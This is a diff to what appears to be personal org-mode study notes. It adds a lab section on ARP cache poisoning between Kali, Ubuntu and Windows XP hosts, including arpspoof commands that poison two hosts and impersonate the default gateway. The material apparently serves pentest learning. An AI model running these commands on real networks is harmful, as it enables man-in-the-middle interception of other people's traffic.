@@ -2128,9 +2128,20 @@ $ arp -a
 
 ** ARP cache poisoning
 
+[ubuntu--192.168.20.11] ------------- [ kali-192.168.20.9] ------------------ [winxp - 192.168.20.10]
+
 #+begin_src shell 
 # enable IP forwarding
 $ echo 1 > /proc/sys/net/ipv4/ip_forward
+$ arpspoof -i eth0 -t 192.168.20.11 192.168.20.10
+$ arpspoof -i eth0 -t 192.168.20.10 192.168.20.11
+#+end_src 
+
+** Using ARP Cache Poisoning to Impersonate the Default Gateway
+
+#+begin_src shell 
+root@kali:~# arpspoof -i eth0 -t 192.168.20.11 192.168.20.1
+root@kali:~# arpspoof -i eth0 -t 192.168.20.1 192.168.20.11
 #+end_src 
 
 * limit CPU usage of a process 
